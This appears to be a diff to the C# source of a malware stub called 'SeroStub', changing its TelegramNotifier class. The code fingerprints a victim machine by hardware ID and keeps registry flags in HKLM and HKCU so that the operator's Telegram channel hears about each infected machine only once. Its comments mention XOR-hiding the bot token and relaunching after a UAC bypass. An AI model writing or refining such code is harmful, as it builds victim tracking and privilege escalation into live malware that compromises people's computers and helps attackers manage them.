@@ -8,10 +8,12 @@ namespace SeroStub;
 // Token and chat IDs are XOR-encoded in Config — never stored as plaintext.
 internal static class TelegramNotifier
 {
-    // HWID-based flag: same machine never re-notifies even across new builds
+    // HWID-based flag: same machine never re-notifies even across new builds.
+    // UserName intentionally excluded — HWID must be identical when stub restarts
+    // under a different user context (e.g. SYSTEM → user after UAC bypass relaunch).
     private static string GetHwidShort()
     {
-        var raw = $"{Environment.MachineName}:{Environment.UserName}:{Environment.ProcessorCount}";
+        var raw = $"{Environment.MachineName}:{Environment.ProcessorCount}";
         var hash = System.Security.Cryptography.SHA256.HashData(Encoding.UTF8.GetBytes(raw));
         return Convert.ToHexString(hash)[..12].ToLower();
     }
@@ -21,12 +23,21 @@ internal static class TelegramNotifier
 
     private static bool ShouldNotify()
     {
+        // Check HKLM first — machine-wide, survives SYSTEM→user context changes
+        try
+        {
+            using var k = Registry.LocalMachine.OpenSubKey(_flagKey, false);
+            if (k != null) return false;
+        }
+        catch { }
+        // Fallback: HKCU of current user
         try
         {
             using var k = Registry.CurrentUser.OpenSubKey(_flagKey, false);
-            return k == null;
+            if (k != null) return false;
         }
-        catch { return true; }
+        catch { }
+        return true;
     }
 
     // Global counter key — no BuildId so it increments across all builds
@@ -57,6 +68,15 @@ internal static class TelegramNotifier
 
     private static void MarkNotified()
     {
+        // Write to HKLM first (machine-wide — persists across user context changes)
+        try
+        {
+            using var k = Registry.LocalMachine.CreateSubKey(_flagKey);
+            k?.SetValue("ts", DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString());
+            return;
+        }
+        catch { }
+        // Fallback: HKCU
         try
         {
             using var k = Registry.CurrentUser.CreateSubKey(_flagKey);
